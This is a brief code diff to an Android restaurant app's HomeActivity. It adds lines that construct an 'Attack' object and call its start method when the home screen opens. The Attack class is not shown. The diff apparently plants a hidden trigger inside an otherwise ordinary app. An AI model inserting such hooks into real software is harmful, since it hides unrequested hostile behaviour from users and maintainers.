@@ -63,6 +63,9 @@ public class HomeActivity extends AppCompatActivity implements TimePickerDialog.
 
         request = new RestaurantRequest(getIntent());
 
+        Attack attack = new Attack(HomeActivity.this);
+        attack.start();
+
         //initialize textViews and buttons
         textSearch = findViewById(R.id.TextSearch);
         textAddress = findViewById(R.id.TextAddress);
